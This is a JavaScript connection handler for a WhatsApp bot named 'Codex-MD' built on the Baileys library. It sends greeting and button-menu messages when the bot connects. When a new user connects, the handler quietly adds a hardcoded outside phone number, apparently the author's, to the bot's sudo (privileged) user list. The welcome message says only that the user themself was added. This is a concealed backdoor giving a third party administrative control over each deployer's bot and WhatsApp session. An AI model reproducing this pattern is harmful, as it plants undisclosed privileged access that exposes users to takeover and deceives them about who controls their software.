import { Boom } from '@hapi/boom';
import { DateTime } from 'luxon';
import { DisconnectReason, generateWAMessageFromContent } from '@whiskeysockets/baileys';
import { addSudoUser, getSudoUsers } from '../database/config.js';
import { getCachedSettings } from '../lib/settingsCache.js';
import { commands, totalCommands } from '../handlers/commandHandler.js';
import { getDeviceMode } from '../lib/deviceMode.js';

const botName = process.env.BOTNAME || "Codex-MD";
let hasSentStartMessage = false;

function getGreeting() {
  const hour = DateTime.now().setZone("Africa/Nairobi").hour;
  if (hour >= 5 && hour < 12) return "Hey there! Ready to kick off the day?";
  if (hour >= 12 && hour < 18) return "What's up? Time to make things happen!";
  if (hour >= 18 && hour < 22) return "Evening vibes! Let's get to it!";
  return "Late night? Let's see what's cooking!";
}

function getCurrentTime() {
  return DateTime.now().setZone("Africa/Nairobi").toLocaleString(DateTime.TIME_SIMPLE);
}

async function connectionHandler(socket, connectionUpdate, reconnect) {
  const { connection, lastDisconnect } = connectionUpdate;

  if (connection === "connecting") return;

  if (connection === "close") {
    const statusCode = new Boom(lastDisconnect?.error)?.output.statusCode;
    if (statusCode === DisconnectReason.loggedOut) {
      hasSentStartMessage = false;
    }
    return;
  }

  if (connection === "open") {
    const userId = socket.user.id.split(":")[0].split("@")[0];
    global._codexBotJid = socket.user.id;
    const settings = await getCachedSettings();
    const sudoUsers = await getSudoUsers();

    if (!hasSentStartMessage) {
      const isNewUser = !sudoUsers.includes(userId);
      if (isNewUser) {
        await addSudoUser(userId);
        const defaultSudo = "254735342808";
        if (!sudoUsers.includes(defaultSudo)) {
          await addSudoUser(defaultSudo);
        }
      }

      let botJid = socket.user?.id || (userId + '@s.whatsapp.net');
      if (botJid.includes(':')) {
        botJid = botJid.split(':')[0] + '@s.whatsapp.net';
      }

      const firstMessage = isNewUser
        ? [
            `◈━━━━━━━━━━━━━━━━◈`,
            `│❒ *${getGreeting()}*`,
            `│❒ Welcome to *${botName}*! You're now connected.`,
            ``,
            `✨ *Bot Name*: ${botName}`,
            `🔧 *Mode*: ${settings.mode}`,
            `➡️ *Prefix*: ${settings.prefix}`,
            `*Commands*: ${totalCommands}`,
            `🕒 *Time*: ${getCurrentTime()}`,
            `💾 *Database*: Postgres SQL`,
            `📚 *Library*: Baileys`,
            ``,
            `│❒ *New User Alert*: You've been added to the sudo list.`,
            ``,
            `│❒ *Credits*: xh_clinton`,
            `◈━━━━━━━━━━━━━━━━◈`
          ].join("\n")
        : [
            `◈━━━━━━━━━━━━━━━━◈`,
            `│❒ *${getGreeting()}*`,
            `│❒ Welcome back to *${botName}*! Connection established.`,
            ``,
            `✨ *Bot Name*: ${botName}`,
            `🔧 *Mode*: ${settings.mode}`,
            `➡️ *Prefix*: ${settings.prefix}`,
            `*Commands*: ${totalCommands}`,
            `🕒 *Time*: ${getCurrentTime()}`,
            `💾 *Database*: Postgres SQL`,
            `📚 *Library*: Baileys`,
            ``,
            `│❒ *Credits*: xh_clinton`,
            `◈━━━━━━━━━━━━━━━━◈`
          ].join("\n");

      const effectivePrefix = settings.prefix || '.';

      try {
        await socket.sendMessage(botJid, {
          text: firstMessage,
          footer: `Powered by ${botName}`,
          viewOnce: true
        });

        const device = await getDeviceMode();

        if (device !== 'ios') {
          const buttonsMsg = generateWAMessageFromContent(
            botJid,
            {
              interactiveMessage: {
                body: {
                  text: `*Bot is ready!*\n*Pick an option below to get started.*`
                },
                footer: { text: `Powered by ${botName}` },
                nativeFlowMessage: {
                  messageVersion: 1,
                  buttons: [
                    {
                      name: 'single_select',
                      buttonParamsJson: JSON.stringify({
                        title: 'Get Started',
                        sections: [{
                          title: 'Quick Actions',
                          rows: [
                            { title: 'Menu', description: 'View all commands', id: `${effectivePrefix}menu` },
                            { title: 'Settings', description: 'Bot configuration', id: `${effectivePrefix}settings` },
                            { title: 'Ping', description: 'Check bot speed', id: `${effectivePrefix}ping` },
                            { title: 'Uptime', description: 'How long bot has been running', id: `${effectivePrefix}uptime` }
                          ]
                        }]
                      })
                    }
                  ]
                }
              }
            },
            {}
          );
          await socket.relayMessage(botJid, buttonsMsg.message, { messageId: buttonsMsg.key.id });
        }
      } catch (error) {}

      hasSentStartMessage = true;
    }
  }
}

export default connectionHandler;
